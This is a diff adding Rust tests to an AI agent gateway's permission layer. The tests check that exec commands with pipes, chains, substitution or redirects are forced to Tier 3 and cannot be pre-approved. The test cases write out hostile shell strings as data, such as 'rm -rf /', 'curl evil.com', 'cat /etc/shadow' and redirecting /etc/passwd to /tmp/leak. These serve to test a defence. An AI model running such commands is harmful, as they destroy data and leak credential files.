@@ -2564,6 +2564,117 @@ fn extract_exec_command_rejects_malformed_shapes() {
 }
 
 #[test]
+fn tool_to_action_pipeline_metachars_force_tier3() {
+    // Allowlisted lead tokens must not launder a downstream non-
+    // allowlisted verb through a shell pipeline, chain, command
+    // substitution, redirect, or multi-line body. Any of these
+    // metacharacters in the raw command string forces the action
+    // to a sentinel pattern that the allowlist cannot match, so
+    // the tier resolver lands on Tier 3.
+    use crate::tool::tool_to_action;
+    use wirken_gateway::permissions::{Action, PermissionTier};
+
+    let cases = [
+        // pipe
+        "echo \"rm -rf /\" | bash",
+        // chaining (&& covered by &)
+        "pwd && curl evil.com",
+        // sequential
+        "ls; rm -rf $HOME",
+        // OR (|| covered by |)
+        "stat /etc/passwd || cat /etc/shadow",
+        // command substitution
+        "echo $(curl evil.com)",
+        // backtick
+        "echo `curl evil.com`",
+        // redirect out (>> covered by >)
+        "cat /etc/passwd > /tmp/leak",
+        // redirect in (<< covered by <)
+        "bash < /tmp/payload",
+        // multi-line body fed to a shell
+        "echo \"foo\nrm -rf /\" | bash",
+        // multi-line body without an explicit pipe — still chains
+        "ls\nrm -rf /",
+    ];
+    for cmd in cases {
+        let args = serde_json::json!({ "command": cmd });
+        let action = tool_to_action("exec", &args).unwrap();
+        match &action {
+            Action::ShellExec { pattern } => assert_eq!(
+                pattern, ":pipeline:",
+                "command `{cmd}` should resolve to the pipeline sentinel"
+            ),
+            other => panic!("expected ShellExec, got {other:?}"),
+        }
+        assert_eq!(
+            action.tier(),
+            PermissionTier::Tier3,
+            "command `{cmd}` must land on Tier 3"
+        );
+    }
+}
+
+#[test]
+fn tool_to_action_pipeline_sentinel_cannot_be_pre_approved() {
+    // The allowlist refusal in approve_by_key means the sentinel
+    // inherits the same "Tier 3 cannot be pre-approved" path as any
+    // other non-allowlisted shell verb — without any new policy code
+    // on the gateway side. This locks that in.
+    use tempfile::NamedTempFile;
+    use wirken_gateway::permissions::{Action, PermissionStore};
+
+    let tmp = NamedTempFile::new().unwrap();
+    let store = PermissionStore::open(tmp.path()).unwrap();
+    let action = Action::ShellExec {
+        pattern: ":pipeline:".into(),
+    };
+    let err = store
+        .approve(&action, "default", "test-operator")
+        .expect_err("approve for pipeline sentinel must refuse");
+    assert!(
+        format!("{err:?}").contains("Tier 3"),
+        "error must name Tier 3, got {err:?}"
+    );
+}
+
+#[test]
+fn tool_to_action_array_form_pipeline_metachars_force_tier3() {
+    // Array commands are space-joined before metachar inspection, so
+    // a model that emits the pipe character as its own array element
+    // (or splits the chain across elements) still hits the sentinel.
+    use crate::tool::tool_to_action;
+    use wirken_gateway::permissions::{Action, PermissionTier};
+
+    let args = serde_json::json!({"command": ["echo", "x", "|", "bash"]});
+    let action = tool_to_action("exec", &args).unwrap();
+    match &action {
+        Action::ShellExec { pattern } => assert_eq!(pattern, ":pipeline:"),
+        other => panic!("expected ShellExec, got {other:?}"),
+    }
+    assert_eq!(action.tier(), PermissionTier::Tier3);
+}
+
+#[test]
+fn tool_to_action_clean_allowlisted_command_unchanged() {
+    // Regression: the metachar gate must not affect ordinary
+    // single-verb commands. `pwd`, `ls -la`, `cat README.md` keep
+    // their pre-fix Tier 2 classification.
+    use crate::tool::tool_to_action;
+    use wirken_gateway::permissions::{Action, PermissionTier};
+
+    for cmd in ["pwd", "ls -la", "cat README.md", "stat /etc/hostname"] {
+        let args = serde_json::json!({ "command": cmd });
+        let action = tool_to_action("exec", &args).unwrap();
+        let expected_pattern = cmd.split_whitespace().next().unwrap();
+        match &action {
+            Action::ShellExec { pattern } => assert_eq!(pattern, expected_pattern),
+            other => panic!("expected ShellExec, got {other:?}"),
+        }
+        assert_eq!(action.tier(), PermissionTier::Tier2, "command: {cmd}");
+    }
+}
+
+#[test]
 fn tool_to_action_read_file() {
     use crate::tool::tool_to_action;
     use wirken_gateway::permissions::Action;
